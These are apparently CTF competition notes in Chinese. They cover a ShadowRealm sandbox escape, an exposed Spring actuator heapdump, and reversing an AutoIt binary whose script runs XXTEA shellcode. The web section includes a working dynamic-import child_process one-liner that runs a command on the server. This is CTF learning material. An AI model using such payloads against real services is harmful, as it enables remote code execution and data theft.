https://test-cuycc6s9lprw.feishu.cn/docx/T7budbiSWoTNd4xQGVicHL1Vnpf
# web

### yet another sandbox

shadowRealm沙箱

> ECMA262 的标准Execution Contexts的执行环境，翻阅该标准可以得知是支持目前已经支持了dynamic import。
> 故可以直接dynamic import到child_processRCE：

```js
import('child_process').then(m=>m.execSync('/readflag > /app/asserts/flag'));
1;
```

### Deserialize?Upload!

先查看`pom.xml`,发现存在`actuator`
其次没有针对actuator路由鉴权,使用spring-scan也可以扫描到

---
复现采用的是linux虚拟机,远程靶机上需要下载heapdump,使用visualVM(`D:\Tools\VisualVM`)
分析,使用OQL引擎查询



# reverse

### auuuu3
提示是autuit3,搜索可以得到官方3.2.5以上没有官方的反编译器

使用第三方工具 `ripper`

`autoit-ripper.exe .\auuuu3.exe ./auuu`
得到au3脚本
发现调用的user32.dll里的函数
```js
Func ENC ( $DATA , $KEY )
	$DATA = Binary ( $DATA )
	Local $DATALEN = BinaryLen ( $DATA )
	If $DATALEN = 0 Then
		Return ""
	ElseIf $DATALEN < 8 Then
		$DATALEN = 8
	EndIf
	Local $OPCODE = "0x83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000"
	Local $CODEBUFFER = DllStructCreate ( "byte[" & BinaryLen ( $OPCODE ) & "]" )
	DllStructSetData ( $CODEBUFFER , 1 , $OPCODE )
	Local $V = DllStructCreate ( "byte[" & Ceiling ( $DATALEN / 4 ) * 4 & "]" )
	DllStructSetData ( $V , 1 , $DATA )
	Local $K = DllStructCreate ( "byte[16]" )
	DllStructSetData ( $K , 1 , $KEY )
	DllCall ( "user32.dll" , "none" , "CallWindowProc" , "ptr" , DllStructGetPtr ( $CODEBUFFER ) , "ptr" , DllStructGetPtr ( $V ) , "int" , Ceiling ( $DATALEN / 4 ) , "ptr" , DllStructGetPtr ( $K ) , "int" , 0 )
	Local $RET = DllStructGetData ( $V , 1 )
	$CODEBUFFER = 0
	$V = 0
	$K = 0
	Return $RET
EndFunc
```
可以发现根据opcode创建了一个dll

```python
import binascii

opcode="83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000"
hexbytes=binascii.a2b_hex(opcode)

with open("enc.dll",'wb')as f:
    f.write(hexbytes)
```

使用ida打开
看不懂算法是啥,->XXTEA,


### 
# pwn

# crypto

# Misc


---
# *相关wp*




2023-11-28   08:44